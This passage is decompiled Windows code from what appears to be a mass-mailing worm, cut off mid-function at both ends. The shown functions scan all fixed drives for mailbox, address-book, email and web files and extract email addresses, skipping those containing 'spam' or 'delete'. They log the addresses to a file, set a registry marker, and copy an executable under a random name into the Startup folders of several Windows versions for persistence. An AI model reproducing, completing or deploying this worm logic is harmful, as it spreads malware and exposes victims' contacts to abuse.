    if(_t48 == 0) {
        _push("nstall");
    } else {
        _t48 = _t48 - 1;
        if(_t48 == 0) {
            _push("nstallation");
L12:
            _push(_t54);
            L0040A100(_t48);
            _pop(__ecx);
            _pop(__ecx);
L13:
            if(L00406840(75) == 0) {
                goto L32;
            }
            _push(3);
            _t36 = L00406850();
            goto L15;
        }
        if(_t48 != 0) {
            goto L13;
        }
        _push("nstaller");
    }
}

L004075E3(
    _unknown_ __ecx,                       // r2
    char* _a4,                             // _cfa_4
    intOrPtr _a8                           // _cfa_8
)
{
    signed int _v8;                        // _cfa_fffffff8
    intOrPtr _v20;                         // _cfa_ffffffec
    intOrPtr _v28;                         // _cfa_ffffffe4
    intOrPtr _v32;                         // _cfa_ffffffe0
    intOrPtr _v36;                         // _cfa_ffffffdc
    char* _v40;                            // _cfa_ffffffd8
    _unknown_ __ebx;                       // r1
    _unknown_ __edi;                       // r4
    _unknown_ __esi;                       // r5
    char* _t25;                            // _t25
    intOrPtr _t26;                         // _t26
    _unknown_ _t27;                        // _t27
    _unknown_ _t28;                        // _t28
    intOrPtr _t29;                         // _t29
    intOrPtr _t30;                         // _t30
    intOrPtr _t31;                         // _t31
    _unknown_ _t32;                        // _t32
    _unknown_ _t33;                        // _t33
    _unknown_ _t34;                        // _t34
    _unknown_ _t35;                        // _t35
    _unknown_ _t38;                        // _t38
    char* _t39;                            // _t39
    _unknown_ _t40;                        // _t40
    intOrPtr* _t41;                        // _t41

    _push(-1);
    _push(4253008);
    _push(4236164);
    _push( *fs:0x0]);
     *fs:0x0] = __esp;
    __esp = __esp - 20;
    _push(__ebx);
    _push(_t40);
    _push(_t38);
    _v28 = __esp;
    _t41 = 0;
    _v8 = 0;
    _push(63);
    _t39 = _a4;
    _push(_t39);
    _t25 = L0040ACB0(__ecx);
    _pop(__ecx);
    _pop(__ecx);
    _v40 = _t25;
    if(_t25 != 0) {
         *_t25 = 0;
    }
    _t26 = L0040A210(_t25, _t39);
    _v32 = _t26;
    if(_t26 < 5) {
L24:
        _v8 = _v8 | -1;
        _t27 = 0;
L25:
         *fs:0x0] = _v20;
        _pop(__edi);
        _pop(__esi);
        _pop(__ebx);
        return _t27;
    }
    _push(46);
    _pop(__ebx);
    _push(__ebx);
    _push(_t39);
    _t28 = L0040ACB0(__ecx);
    _pop(__ecx);
    _pop(__ecx);
    if(_t28 == 0) {
        goto L24;
    }
    if(_a8 == _t41) {
L15:
        _v36 = 0;
        while(1) {
            _t29 = _v36;
            if(_t29 >= _v32) {
                break;
            }
            _t30 =  *((intOrPtr*)(_t29 + _t39));
            if(_t30 < 33 || _t30 > 126) {
                goto L24;
            } else {
                _v36 = _v36 + 1;
                continue;
            }
        }
        _push("()<>,;:\\"[]");
        _push(_t39);
        _t27 = L0040ADA0();
        _pop(__ecx);
        _pop(__ecx);
        if(_t27 == 0) {
            _push(1);
            _pop(__eax);
        } else {
            _t27 = 0;
        }
        _v8 = _v8 | -1;
        goto L25;
    }
    _push(_t39);
    __imp__CharLowerA();
    if(_a8 == _t41) {
        goto L15;
    }
    if(_v32 > 63 ||  *_t39 == 64) {
        goto L24;
    } else {
        _push(64);
        _push(_t39);
        _t31 = L0040ACB0(__ecx);
        _pop(__ecx);
        _pop(__ecx);
        _v40 = _t31;
        if(_t31 == _t41 ||  *((intOrPtr*)(_t31 - 1)) == __bl) {
            goto L24;
        } else {
            _t41 = _t31 + 1;
            if( *_t41 == __bl) {
                goto L24;
            }
            _push(__ebx);
            _push(_t31);
            _t32 = L0040ACB0(__ecx);
            _pop(__ecx);
            _pop(__ecx);
            if(_t32 == 0) {
                goto L24;
            }
            _push(64);
            _push(_t41);
            _t33 = L0040ACB0(__ecx);
            _pop(__ecx);
            _pop(__ecx);
            if(_t33 != 0) {
                goto L24;
            }
            _push("spam");
            _push(_t39);
            _t34 = L0040A070(_t33, __edx);
            _pop(__ecx);
            _pop(__ecx);
            if(_t34 != 0) {
                goto L24;
            }
            _push("delete");
            _push(_t39);
            _t35 = L0040A070(_t34, __edx);
            _pop(__ecx);
            _pop(__ecx);
            if(_t35 != 0) {
                goto L24;
            }
            goto L15;
        }
    }
}

signed int L0040772C(
    intOrPtr _a4                           // _cfa_4
)
{
    signed int _v8;                        // _cfa_fffffff8
    intOrPtr _v20;                         // _cfa_ffffffec
    intOrPtr* _v28;                        // _cfa_ffffffe4
    signed int _v32;                       // _cfa_ffffffe0
    signed int _v40;                       // _cfa_ffffffd8
    char _v297;                            // _cfa_fffffed7
    char _v298;                            // _cfa_fffffed6
    char _v299;                            // _cfa_fffffed5
    char _v300;                            // _cfa_fffffed4
    signed int _v304;                      // _cfa_fffffed0
    signed int _v308;                      // _cfa_fffffecc
    signed int _v312;                      // _cfa_fffffec8
    signed int __ebx;                      // r1
    _unknown_ __edi;                       // r4
    _unknown_ __esi;                       // r5
    signed int _t28;                       // _t28
    signed int _t29;                       // _t29
    intOrPtr _t34;                         // _t34
    _unknown_ _t42;                        // _t42
    signed int _t43;                       // _t43
    _unknown_ _t44;                        // _t44

    _push(-1);
    _push(4253024);
    _push(4236164);
    _push( *fs:0x0]);
     *fs:0x0] = __esp;
    __esp = __esp - 292;
    _push(__ebx);
    _push(_t44);
    _push(_t42);
    _v28 = __esp;
    _t43 = 0;
    _v8 = 0;
    L00401BE7(4302872);
    _t28 = L0040AA95(80000);
    _v308 = _t28;
    _v32 = _t28;
    if(_t28 == 0) {
L8:
        _v8 = _v8 | -1;
         *fs:0x0] = _v20;
        _pop(__edi);
        _pop(__esi);
        _pop(__ebx);
        return _t28;
    }
    __imp__GetLogicalDrives();
    __ebx = _t28;
    _v40 = __ebx;
    while(1) {
        _v304 = _t43;
        if(_t43 >= 26) {
            break;
        }
        _push(1);
        _pop(__eax);
        _t28 = _t28 << _t43;
        if((__ebx & _t28) != 0) {
            _v300 = _t43 + 65;
            _v299 = 58;
            _v298 = 92;
            _v297 = 0;
            _t28 =  &_v300;
            _push( &_v300);
            __imp__GetDriveTypeA();
            if( &_v300 == 3) {
                _t28 = L0040786C( &_v300, _v32, _a4);
            }
        }
        _t43 = _t43 + 1;
    }
    _t29 = _v32;
    _v312 = _t29;
    _push(_t29);
    L0040AB34();
     *__esp = 4271872;
    _push("%s\\germs0.dbv");
    _push( &_v300);
    __imp__wsprintfA();
    __esp = __esp + 12;
    L00401C5A(4302872,  &_v300);
    _t34 = L00401BE7(4302872);
    _push(1);
    _pop(__eax);
     *4271628 = _t34;
    _t28 = L004066EB(-2147483646, 4302344, "CacheBox Outfit", _t34, "yes");
    goto L8;
}

L0040786C(
    char* _a4,                             // _cfa_4
    intOrPtr _a8,                          // _cfa_8
    intOrPtr _a12                          // _cfa_c
)
{
    signed int _v8;                        // _cfa_fffffff8
    intOrPtr _v20;                         // _cfa_ffffffec
    intOrPtr _v28;                         // _cfa_ffffffe4
    char* _v32;                            // _cfa_ffffffe0
    char _v292;                            // _cfa_fffffedc
    char _v568;                            // _cfa_fffffdc8
    char _v612;                            // _cfa_fffffd9c
    char* _v616;                           // _cfa_fffffd98
    char* _v620;                           // _cfa_fffffd94
    char _v880;                            // _cfa_fffffc90
    char* _v884;                           // _cfa_fffffc8c
    char _v888;                            // _cfa_fffffc88
    char* _v892;                           // _cfa_fffffc84
    _unknown_ __ebx;                       // r1
    char* __edi;                           // r4
    intOrPtr* __esi;                       // r5
    _unknown_ _t62;                        // _t62
    _unknown_ _t73;                        // _t73
    _unknown_ _t75;                        // _t75
    _unknown_ _t87;                        // _t87
    _unknown_ _t89;                        // _t89

    _push(-1);
    _push(4253040);
    _push(4236164);
    _push( *fs:0x0]);
     *fs:0x0] = __esp;
    __esp = __esp - 872;
    _push(_t87);
    _push(__esi);
    _push(__edi);
    _v28 = __esp;
    _v8 = 0;
    _push(_a12);
    _t62 = L00408962();
    _t88 = _a4;
    if( *((char*)(L0040A210(_t62, _t88) + _t88 - 1)) == 92) {
         *((char*)(L0040A210(_t63, _t88) + _t88 - 1)) = 0;
    }
    _push(_t88);
    _push( &_v880);
    L0040A0F0(__edx);
    L0040A100( &_v880,  &_v880, "\\*");
    __esp = __esp + 8;
    _push( &_v612);
    _push( &_v880);
    __imp__FindFirstFileA();
    _v32 =  &_v880;
    if( &_v880 == -1) {
L24:
        _v8 = _v8 | -1;
         *fs:0x0] = _v20;
        _pop(__edi);
        _pop(__esi);
        _pop(__ebx);
        return;
    } else {
        __edi = "%s\\%s";
        __esi = __imp__wsprintfA;
        do {
            if((_v612 & 16) == 0) {
                _v620 = 0;
                _v616 = 0;
                _push( &_v568);
                __imp__CharLowerA();
                _push(46);
                _push( &_v568);
                L0040A1E0(_t89);
                _pop(__ecx);
                _pop(__ecx);
                _t88 =  &_v568;
                _v620 =  &_v568;
                __eflags =  &_v568;
                if(__eflags == 0) {
                    goto L22;
                }
                _push("ht");
                _push( &_v568);
                L0040A070( &_v568, __edx);
                _pop(__ecx);
                _pop(__ecx);
                _v616 =  &_v568;
                __eflags =  &_v568;
                if( &_v568 != 0) {
L12:
                    _push( &_v568);
                    _push(_a4);
                    _push(__edi);
                    _push( &_v292);
                     *__esi();
                    L00407B30(__edx,  &_v292, _a8);
                    __esp = __esp + 16;
                    goto L22;
                }
                _push("asp");
                _push( &_v568);
                L0040A070( &_v568, __edx);
                _pop(__ecx);
                _pop(__ecx);
                _v616 =  &_v568;
                __eflags =  &_v568;
                if( &_v568 == 0) {
                    _push(".mbx");
                    _push( &_v568);
                    L0040D680(_t89);
                    _pop(__ecx);
                    _pop(__ecx);
                    __eflags =  &_v568;
                    if( &_v568 == 0) {
L17:
                        _push( &_v568);
                        _push(_a4);
                        _push(__edi);
                        _push( &_v292);
                         *__esi();
                        __esp = __esp + 16;
                        _push(0);
                        _push(128);
                        _push(3);
                        _push(0);
                        _push(3);
                        _push(-2147483648);
                        _push( &_v292);
                        __imp__CreateFileA();
                        _t88 =  &_v292;
                        _v892 =  &_v292;
                        __eflags =  &_v292 - -1;
                        if(__eflags != 0) {
                            _push(0);
                            _push( &_v292);
                            __imp__GetFileSize();
                            _v884 =  &_v292;
                            __eflags =  &_v292 - 80000;
                            if( &_v292 >= 80000) {
                                _v884 = 79999;
                            }
                            _push(0);
                            _push( &_v888);
                            _push(_v884);
                            _push(_a8);
                            _push(_t88);
                            __imp__ReadFile();
                            _push(_t88);
                            __imp__CloseHandle();
                            __eflags = _v884 - 100;
                            if(__eflags > 0) {
                                _push(_v884);
                                _push(_a8);
                                L00407CBA(__edx);
                                _pop(__ecx);
                                _pop(__ecx);
                            }
                        }
                        goto L22;
                    }
                    _push(".dbx");
                    _push( &_v568);
                    L0040D680(_t89);
                    _pop(__ecx);
                    _pop(__ecx);
                    __eflags =  &_v568;
                    if( &_v568 == 0) {
                        goto L17;
                    }
                    _push(".wab");
                    _push( &_v568);
                    L0040D680(_t89);
                    _pop(__ecx);
                    _pop(__ecx);
                    __eflags =  &_v568;
                    if( &_v568 == 0) {
                        goto L17;
                    }
                    _push(".eml");
                    _push( &_v568);
                    L0040D680(_t89);
                    _pop(__ecx);
                    _pop(__ecx);
                    __eflags =  &_v568;
                    if(__eflags != 0) {
                        goto L22;
                    }
                    goto L17;
                }
                goto L12;
            }
            _push(".");
            _push( &_v568);
            _t73 = L0040AAB0();
            _pop(__ecx);
            _pop(__ecx);
            if(_t73 != 0) {
                _push("..");
                _push( &_v568);
                _t75 = L0040AAB0();
                _pop(__ecx);
                _pop(__ecx);
                if(_t75 != 0) {
                    _push( &_v568);
                    _push(_t88);
                    _push(__edi);
                    _push( &_v292);
                     *__esi();
                    L0040786C( &_v292, _a8, _a12);
                    __esp = __esp + 16;
                }
            }
L22:
            _push( &_v612);
            _push(_v32);
            __imp__FindNextFileA();
        } while( &_v612 != 0);
        _push(_v32);
        __imp__FindClose();
        goto L24;
    }
}

L00407B30(
    intOrPtr __edx,                        // r3
    intOrPtr _a4,                          // _cfa_4
    intOrPtr _a8                           // _cfa_8
)
{
    signed int _v8;                        // _cfa_fffffff8
    intOrPtr _v20;                         // _cfa_ffffffec
    intOrPtr _v28;                         // _cfa_ffffffe4
    char _v32;                             // _cfa_ffffffe0
    intOrPtr _v36;                         // _cfa_ffffffdc
    intOrPtr _v40;                         // _cfa_ffffffd8
    intOrPtr _v44;                         // _cfa_ffffffd4
    intOrPtr _v48;                         // _cfa_ffffffd0
    intOrPtr _v52;                         // _cfa_ffffffcc
    intOrPtr _v56;                         // _cfa_ffffffc8
    _unknown_ __ebx;                       // r1
    char* __edi;                           // r4
    _unknown_ __esi;                       // r5
    char* _t28;                            // _t28
    intOrPtr _t29;                         // _t29
    intOrPtr _t31;                         // _t31
    intOrPtr* _t32;                        // _t32
    _unknown_ _t33;                        // _t33
    intOrPtr _t37;                         // _t37
    _unknown_ _t39;                        // _t39
    char* _t40;                            // _t40

    _t37 = __edx;
    _push(-1);
    _push(4253056);
    _push(4236164);
    _t28 =  *fs:0x0];
    _push(_t28);
     *fs:0x0] = __esp;
    __esp = __esp - 36;
    _push(_t33);
    _push(_t39);
    _push(__edi);
    _v28 = __esp;
    _v8 = 0;
    _push(0);
    __imp__Sleep();
    _push(0);
    _push(0);
    _push(3);
    _push(0);
    _push(3);
    _push(-2147483648);
    _push(_a4);
    __imp__CreateFileA();
    _t40 = _t28;
    _v40 = _t40;
    if(_t40 == -1) {
L27:
        _v8 = _v8 | -1;
         *fs:0x0] = _v20;
        _pop(__edi);
        _pop(__esi);
        _pop(__ebx);
        return _t28;
    }
    _push(0);
    _push(_t40);
    __imp__GetFileSize();
    __edi = _t28;
    _v36 = __edi;
    if(__edi == -1 || __edi < 50) {
        _push(_t40);
        goto L26;
    } else {
        if(__edi > 80000) {
            __edi = 79995;
            _v36 = 79995;
        }
        _push(0);
        _t28 =  &_v32;
        _push( &_v32);
        _push(__edi);
        _t40 = _a8;
        _push(_t40);
        _push(_v40);
        __imp__ReadFile();
        if( &_v32 == 0) {
L24:
            _push(_v40);
L26:
            __imp__CloseHandle();
            goto L27;
        } else {
             *((char*)(__edi + _t40)) = 0;
            _push(_t40);
            __imp__CharLowerA();
            _v48 = _t40;
            while(1) {
                _push("mailto:");
                _push(_t40);
                _t28 = L0040A070(_t28, _t37);
                _pop(__ecx);
                _pop(__ecx);
                __edi = _t28;
                _v56 = __edi;
                if(__edi == 0) {
                    goto L24;
                }
                _push(34);
                _push(__edi);
                _t28 = L0040ACB0(_t35);
                _pop(__ecx);
                _pop(__ecx);
                _t40 = _t28;
                _v48 = _t40;
                if(_t40 != 0) {
L10:
                    _t37 = _t40 - __edi;
                    _v44 = _t37;
                    if(_t37 < 12) {
                        continue;
                    }
                    _v52 = 7;
                    while(1) {
                        _t29 = _v52;
                        if(_t29 >= _t37) {
                            break;
                        }
                        _t32 = _t29 + __edi;
                        _t35 =  *_t32;
                        if(_t35 <= 32 || _t35 >= 127) {
                            _v52 = _v52 + 1;
                            continue;
                        } else {
                            __edi = _t32;
                            _v56 = __edi;
                            break;
                        }
                    }
                    _t31 = _t40 - __edi;
                    while(1) {
                        _t31 = _t31 - 1;
                        _v52 = _t31;
                        if(_t31 <= 3) {
                            break;
                        }
                        _t35 = _t31 + __edi;
                        _t37 =  *_t35;
                        if(_t37 <= 32 || _t37 >= 127) {
                            continue;
                        } else {
                             *((char*)(_t35 + 1)) = 0;
                            break;
                        }
                    }
                    _push(1);
                    _push(__edi);
                    _t28 = L004075E3(_t35);
                    _pop(__ecx);
                    _pop(__ecx);
                    if(_t28 != 0) {
                        _push(1);
                        _push(__edi);
                        _t35 = 4302872;
                        _t28 = L00401B22(4302872);
                    }
                    continue;
                }
                _push(39);
                _push(__edi);
                _t28 = L0040ACB0(_t35);
                _pop(__ecx);
                _pop(__ecx);
                _t40 = _t28;
                _v48 = _t40;
                if(_t40 == 0) {
                    goto L24;
                }
                goto L10;
            }
            goto L24;
        }
    }
}

L00407CBA(
    _unknown_ __edx,                       // r3
    intOrPtr _a4,                          // _cfa_4
    intOrPtr _a8                           // _cfa_8
)
{
    signed int _v8;                        // _cfa_fffffff8
    intOrPtr _v20;                         // _cfa_ffffffec
    intOrPtr _v28;                         // _cfa_ffffffe4
    intOrPtr _v32;                         // _cfa_ffffffe0
    intOrPtr _v36;                         // _cfa_ffffffdc
    _unknown_ _v52;                        // _cfa_ffffffcc
    intOrPtr _v56;                         // _cfa_ffffffc8
    char _v116;                            // _cfa_ffffff8c
    intOrPtr _v120;                        // _cfa_ffffff88
    intOrPtr _v124;                        // _cfa_ffffff84
    intOrPtr* _v128;                       // _cfa_ffffff80
    signed int _v132;                      // _cfa_ffffff7c
    intOrPtr _v136;                        // _cfa_ffffff78
    _unknown_ __ebx;                       // r1
    _unknown_ __edi;                       // r4
    _unknown_ __esi;                       // r5
    intOrPtr _t66;                         // _t66
    intOrPtr _t67;                         // _t67
    intOrPtr _t69;                         // _t69
    _unknown_ _t75;                        // _t75
    intOrPtr _t78;                         // _t78
    _unknown_ _t79;                        // _t79
    intOrPtr _t86;                         // _t86
    intOrPtr _t87;                         // _t87
    intOrPtr _t88;                         // _t88
    intOrPtr _t96;                         // _t96
    intOrPtr _t97;                         // _t97
    _unknown_ _t98;                        // _t98
    intOrPtr _t100;                        // _t100
    _unknown_ _t101;                       // _t101
    intOrPtr* _t102;                       // _t102

    _push(-1);
    _push(4253072);
    _push(4236164);
    _push( *fs:0x0]);
     *fs:0x0] = __esp;
    __esp = __esp - 116;
    _push(_t79);
    _push(_t101);
    _push(_t98);
    _v28 = __esp;
    _t102 = "()<>,;:\\"[]?";
    asm("movsd");
    asm("movsd");
    asm("movsd");
    asm("movsw");
    _v132 = 0;
    _v8 = 0;
    _push(0);
    __imp__Sleep();
    _t100 = _a4;
    if(_t100 != 0) {
        _v32 = _t100;
        while(1) {
L4:
            _t65 = _v32 + 1;
            _v56 = _v32 + 1;
            _t66 = L0040ADE0(_t100 - _v32 + 1 + _a8, _t65, 64, _t100 - _v32 + 1 + _a8);
            _v32 = _t66;
            if(_t66 != 0) {
                _t67 = _t66 - _t100;
                _v136 = _t67;
                _v128 = 0;
                _t86 = _t67 - 1;
                goto L7;
            } else {
                _t78 = _v132;
                goto L2;
            }
            while(1) {
L7:
                _v120 = _t86;
                if(_t86 < 0) {
                    break;
                }
                _t102 = _t86 + _t100;
                _t96 =  *_t102;
                if(_t96 < 33 || _t96 > 126) {
                    _v128 = _t86 + _t100;
                    break;
                } else {
                    _v124 = 0;
                    while(_v124 < 13) {
                        if(_t96 !=  *((intOrPtr*)(__ebp + _v124 - 48))) {
                            _v124 = _v124 + 1;
                            continue;
                        } else {
                            _v128 = _t102;
                            break;
                        }
                    }
                    if(_v128 != 0) {
L20:
                        _v128 = _v128 + 1;
L21:
                        _t87 = _v32;
                        if(_t87 - _v128 > 50 || _t87 == _v128) {
                            goto L4;
                        } else {
                            _t88 = 0;
                            _v56 = 0;
                            while(1) {
                                _t67 = _t67 + 1;
                                _v120 = _t67;
                                if(_t67 >= _a8) {
                                    break;
                                }
                                _t102 = _t67 + _t100;
                                _t97 =  *_t102;
                                if(_t97 < 33 || _t97 > 126) {
                                    _t88 = _t67 + _t100;
                                    _v56 = _t88;
                                    break;
                                } else {
                                    _v124 = 0;
                                    while(_v124 < 13) {
                                        if(_t97 !=  *((intOrPtr*)(__ebp + _v124 - 48))) {
                                            _v124 = _v124 + 1;
                                            continue;
                                        }
                                        _t88 = _t102;
                                        _v56 = _t88;
                                        break;
                                    }
                                    if(_t88 != 0) {
L36:
                                        _t69 = _t88 - _v32;
                                        _v36 = _t69;
                                        if(_t69 >= 4 && _t69 <= 50) {
                                            _t89 = _t88 - _v128;
                                            _t102 = _t88 - _v128;
                                            _v36 = _t102;
                                            if(_t102 <= 60 && _t102 >= 5) {
                                                _push(60);
                                                _push(0);
                                                _push( &_v116);
                                                L0040A590();
                                                _push(_t102);
                                                _push(_v128);
                                                _push( &_v116);
                                                L0040A460( &_v116);
                                                _push(1);
                                                _pop(__esi);
                                                _t75 = L004075E3(_t89,  &_v116, _t102);
                                                __esp = __esp + 24;
                                                if(_t75 != 0 && L00401B22(4302872,  &_v116, _t102) != 0) {
                                                    _v132 = _t102;
                                                }
                                            }
                                        }
                                        goto L4;
                                    }
                                    continue;
                                }
                            }
                            if(_t88 == 0) {
                                goto L4;
                            }
                            goto L36;
                        }
                    } else {
                        _t86 = _t86 - 1;
                        continue;
                    }
                }
            }
            if(_v128 != 0) {
                goto L20;
            }
            _v128 = _t100;
            goto L21;
        }
        goto L2;
    } else {
        _t78 = 0;
L2:
        _v8 = _v8 | -1;
         *fs:0x0] = _v20;
        _pop(__edi);
        _pop(__esi);
        _pop(__ebx);
        return _t78;
    }
}

L00407E9C(
    intOrPtr _a4                           // _cfa_4
)
{
    signed int _v8;                        // _cfa_fffffff8
    intOrPtr _v20;                         // _cfa_ffffffec
    intOrPtr _v28;                         // _cfa_ffffffe4
    char* _v32;                            // _cfa_ffffffe0
    intOrPtr _v36;                         // _cfa_ffffffdc
    char _v288;                            // _cfa_fffffee0
    char _v292;                            // _cfa_fffffedc
    char _v392;                            // _cfa_fffffe78
    _unknown_ __ebx;                       // r1
    _unknown_ __edi;                       // r4
    _unknown_ __esi;                       // r5
    _unknown_ _t27;                        // _t27
    char _t41;                             // _t41
    intOrPtr _t42;                         // _t42
    _unknown_ _t46;                        // _t46
    _unknown_ _t49;                        // _t49
    _unknown_ _t51;                        // _t51
    _unknown_ _t54;                        // _t54
    intOrPtr* _t56;                        // _t56

    _push(-1);
    _push(4253088);
    _push(4236164);
    _push( *fs:0x0]);
     *fs:0x0] = __esp;
    __esp = __esp - 372;
    _push(_t46);
    _push(_t54);
    _push(_t51);
    _v28 = __esp;
    _v8 = 0;
    _push( &_v392);
    _t47 = "Unfile";
    _push("Unfile");
    _push(4302344);
    _push(-2147483646);
    _t27 = L0040679E();
    __esp = __esp + 16;
    if(_t27 == 0) {
        _push(5);
        _push(L00406850() + 3);
        _push( &_v392);
        L004068F4();
        _push(".");
        _push( &_v392);
        L0040A100( &_v392);
        _push( &_v392);
        _t41 = L0040A210( &_v392);
        _v292 = _t41;
        _t42 = __ebp + _t41 - 388;
        _v36 = _t42;
        _push(3);
        _push(_t42);
        L004068F4();
        L004066EB(-2147483646, 4302344, _t47, 1,  &_v392);
        __esp = __esp + 32;
    }
    _push( &_v392);
    _push(4271872);
    _push("%s\\%s");
    _push( &_v288);
    _t56 = __imp__wsprintfA;
     *_t56();
    __esp = __esp + 16;
    _push(0);
    _push(128);
    _push(4);
    _push(0);
    _push(3);
    _push(1073741824);
    _push( &_v288);
    __imp__CreateFileA();
    _v32 =  &_v288;
    if( &_v288 != -1) {
        _push(2);
        _push(0);
        _push(0);
        _push( &_v288);
        __imp__SetFilePointer();
        _push(_a4);
        _push("%s\n");
        _push( &_v288);
         *_t56();
        __esp = __esp + 12;
        _push(0);
        _push( &_v292);
        L0040A210( &_v288,  &_v288);
        _push( &_v288);
        _push( &_v288);
        _push( &_v288);
        __imp__WriteFile();
        _push( &_v288);
        __imp__CloseHandle();
    }
    _v8 = _v8 | -1;
     *fs:0x0] = _v20;
    _pop(__edi);
    _pop(__esi);
    _pop(__ebx);
}

L00408003(
    intOrPtr _a4,                          // _cfa_4
    intOrPtr _a8                           // _cfa_8
)
{
    signed int _v8;                        // _cfa_fffffff8
    intOrPtr _v20;                         // _cfa_ffffffec
    intOrPtr _v28;                         // _cfa_ffffffe4
    char _v60;                             // _cfa_ffffffc4
    char _v159;                            // _cfa_ffffff61
    char _v160;                            // _cfa_ffffff60
    char _v184;                            // _cfa_ffffff48
    intOrPtr _v188;                        // _cfa_ffffff44
    signed int _v192;                      // _cfa_ffffff40
    char _v452;                            // _cfa_fffffe3c
    signed int _v456;                      // _cfa_fffffe38
    signed int _v460;                      // _cfa_fffffe34
    signed int _v464;                      // _cfa_fffffe30
    char _v488;                            // _cfa_fffffe18
    intOrPtr _v492;                        // _cfa_fffffe14
    char _v508;                            // _cfa_fffffe04
    char _v607;                            // _cfa_fffffda1
    char _v608;                            // _cfa_fffffda0
    _unknown_ __ebx;                       // r1
    _unknown_ __edi;                       // r4
    _unknown_ __esi;                       // r5
    signed int _t115;                      // _t115
    char* _t116;                           // _t116
    signed int _t119;                      // _t119
    signed int _t122;                      // _t122
    char* _t123;                           // _t123
    signed int _t132;                      // _t132
    signed int _t138;                      // _t138
    signed int _t142;                      // _t142
    signed int _t161;                      // _t161
    char* _t162;                           // _t162
    signed int _t166;                      // _t166
    signed int _t167;                      // _t167
    intOrPtr _t170;                        // _t170
    intOrPtr _t175;                        // _t175
    _unknown_ _t180;                       // _t180
    char* _t181;                           // _t181
    signed int _t182;                      // _t182
    _unknown_ _t191;                       // _t191
    char* _t206;                           // _t206
    _unknown_ _t207;                       // _t207
    intOrPtr* _t212;                       // _t212

    _push(-1);
    _push(4253104);
    _push(4236164);
    _push( *fs:0x0]);
     *fs:0x0] = __esp;
    __esp = __esp - 588;
    _push(_t180);
    _push(_t207);
    _push(_t191);
    _v28 = __esp;
    __edx = 0;
    _v8 = 0;
    _v160 = 0;
    _push(24);
    _pop(__ecx);
    _push(_t182 << 2);
    _push(0);
    _push( &_v159);
    memset();
    __esp = __esp + 12;
    asm("stosw");
    asm("stosb");
    _v608 = 0;
    _push(24);
    _pop(__ecx);
    _push(0 << 2);
    _push(0);
    _push( &_v607);
    memset();
    __esp = __esp + 12;
    asm("stosw");
    asm("stosb");
    _push(7);
    _pop(__ecx);
    _push(0 << 2);
    _push("\\Start menu\\Programs\\Startup");
    _push( &_v60);
    memcpy();
    __esp = __esp + 12;
    asm("movsb");
    _push(6);
    _pop(__ecx);
    _push(0 << 2);
    _push("Documents and Settings\\");
    _push( &_v184);
    memcpy();
    __esp = __esp + 12;
    asm("movsd");
    asm("movsd");
    asm("movsd");
    asm("movsd");
    _push(5);
    _pop(__ecx);
    _push(0 << 2);
    _push("abcdefghjklmnorstvwxyz");
    _push( &_v488);
    memcpy();
    __esp = __esp + 12;
    asm("movsw");
    asm("movsb");
    _v492 = 3;
    _push("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Explorer");
    _push( &_v608);
    L0040A0F0(0);
    _push("\\Shell Folders");
    _push( &_v608);
    L0040A100( &_v608);
    _t112 = L0040679E(-2147483647,  &_v608, "Startup",  &_v160);
    __esp = __esp + 16;
    if(_t112 != 0) {
        _push(92);
        _push( &_v160);
        _t170 = L0040ACB0(0);
        _v188 = _t170;
        _push(_t170 + 1);
        _push( &_v160);
        L0040A0F0(0);
        _push(92);
        _push( &_v160);
        _t175 = L0040ACB0(0);
        _v188 = _t175;
        _push(_t175);
        _push( &_v160);
        L0040A0F0(0);
        _t112 = L0040D680(0,  &_v160,  &_v60);
        __esp = __esp + 32;
        if(_t112 == 0) {
            _v492 = 2;
        }
    }
    _push(1);
    _pop(__eax);
    _v456 = _t112;
    _t181 = "\\";
    _t206 = ".exe";
    _t212 = __imp__CopyFileA;
    while(_v456 <= 4) {
        while(_v460 <= _v492) {
            _push(_a4);
            _push( &_v452);
            L0040A0F0(0);
            _pop(__ecx);
            _pop(__ecx);
            _t138 = _v456 - 1;
            if(_t138 == 0) {
                _push("Windows");
L15:
                _push( &_v452);
                L0040A100( &_v452);
                _pop(__ecx);
                _pop(__ecx);
L16:
                _t142 = _v460 - 1;
                if(_t142 == 0) {
                    _push("\\All Users");
                    _push( &_v452);
                    L0040A100( &_v452);
                    L0040A100( &_v452,  &_v452,  &_v60);
                    __esp = __esp + 8;
L23:
                    _t112 =  &_v452;
                    _push( &_v452);
                    __imp__GetFileAttributesA();
                    _v192 =  &_v452;
                    if(( &_v452 & 16) != 0 &&  &_v452 != -1) {
                        _push(6);
                        _push(L00406850() + 4);
                        _push( &_v608);
                        L004068F4();
                        _push(22);
                        _v608 =  *((intOrPtr*)(__ebp + L00406850() - 484));
                        _push(_t181);
                        _push( &_v452);
                        L0040A100( &_v452);
                        _push( &_v608);
                        _push( &_v452);
                        L0040A100( &_v452);
                        L0040A100( &_v452,  &_v452, _t206);
                        __esp = __esp + 32;
                        _push(1);
                        _t112 =  &_v452;
                        _push( &_v452);
                        _push(_a8);
                         *_t212();
                    }
                    _v460 = _v460 + 1;
                    _push(1);
                    _pop(__eax);
                    continue;
                }
                _t161 = _t142 - 1;
                if(_t161 == 0) {
                    _t162 =  &_v60;
L20:
                    _push(_t162);
                    _push( &_v452);
                    L0040A100( &_v452);
                    _pop(__ecx);
                    _pop(__ecx);
                    goto L23;
                }
                if(_t161 != 1) {
                    goto L23;
                }
                _t162 =  &_v160;
                goto L20;
            }
            _t166 = _t138 - 1;
            if(_t166 == 0) {
                _push("WinMe");
                goto L15;
            }
            _t167 = _t166 - 1;
            if(_t167 == 0) {
                _push("Win95");
                goto L15;
            }
            if(_t167 != 1) {
                goto L16;
            }
            _push("Win98");
            goto L15;
        }
        _v456 = _v456 + 1;
    }
    _v456 = _t112;
    while(_v456 <= 2) {
        _v460 = _t112;
        while(_v460 <= 3) {
            _v464 = _t112;
            while(_v464 < _v492) {
                _push(_a4);
                _push( &_v452);
                L0040A0F0(0);
                _pop(__ecx);
                _pop(__ecx);
                _t115 = _v456 - 1;
                if(_t115 == 0) {
                    _t116 =  &_v184;
L38:
                    _push(_t116);
                    _push( &_v452);
                    L0040A100( &_v452);
                    _pop(__ecx);
                    _pop(__ecx);
L39:
                    _t119 = _v460 - 1;
                    if(_t119 == 0) {
                        _push("All Users");
L45:
                        _push( &_v452);
                        L0040A100( &_v452);
                        _pop(__ecx);
                        _pop(__ecx);
L46:
                        _t122 = _v464 - 1;
                        if(_t122 == 0) {
                            _t123 =  &_v60;
L50:
                            _push(_t123);
                            _push( &_v452);
                            L0040A100( &_v452);
                            _pop(__ecx);
                            _pop(__ecx);
L51:
